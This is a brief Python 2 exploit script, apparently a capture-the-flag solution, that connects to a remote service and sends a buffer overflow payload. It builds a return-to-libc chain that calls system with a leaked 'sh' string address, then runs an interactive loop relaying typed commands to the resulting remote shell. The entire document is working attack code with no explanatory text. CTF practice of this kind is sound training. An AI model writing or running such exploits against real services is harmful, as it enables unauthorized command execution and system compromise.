from socket import *
from struct import *
import time

p32 = lambda x : pack('<L', x)

s = socket(AF_INET, SOCK_STREAM)
s.connect(('cykor.kr', 10003))

inputsize = '100'

payload = 'A'*63+'\0'+'A'*12

a = s.recv(1024)
time.sleep(0.5)
print a
b = s.recv(1024)
time.sleep(0.5)
print b

binsh = int(b[82:92], 16)
binsh += 88

system = 0x80484c0

s.send(inputsize + '\n')
time.sleep(0.5)
print s.recv(1024)
time.sleep(0.5)

payload += p32(system)
payload += "AAAA"
payload += p32(binsh)
payload += "sh"

s.send(payload + '\n')
time.sleep(0.5)

while 1:
	shell = raw_input('$ ')
	if shell == 'exit': break
	s.send(shell + '\n')
	time.sleep(0.5)
	print s.recv(1024)

s.close()

